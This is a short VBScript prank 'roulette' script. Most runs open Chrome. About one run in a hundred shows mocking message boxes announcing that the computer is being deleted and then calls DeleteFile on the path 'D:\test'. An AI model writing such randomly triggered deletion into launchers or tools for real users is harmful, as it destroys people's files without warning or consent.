randomNumber = Int((100 * Rnd) + 1)

if randomNumber = 1 then
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	folderPath = "D:\test"
	MsgBox "OH WOW GOOD JOB!", 64 + 1, ":0"
	MsgBox "YOU JUST WON A ROULETTE!", 48 + 1, "OMAGA"
	MsgBox "And The Prize is...", 32 + 1, "*Drum Rolls"
	MsgBox "Deleting your computer.", 0 + 1, ">:)"
	MsgBox "Goodbye", 0 + 1, " "
    	objFSO.DeleteFile folderPath
    	Set objFSO = Nothing

else
	Set WshShell = CreateObject("WScript.Shell")
	exePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
	WshShell.Run """" & exePath & """", 1, false
	Set WshShell = Nothing
end if
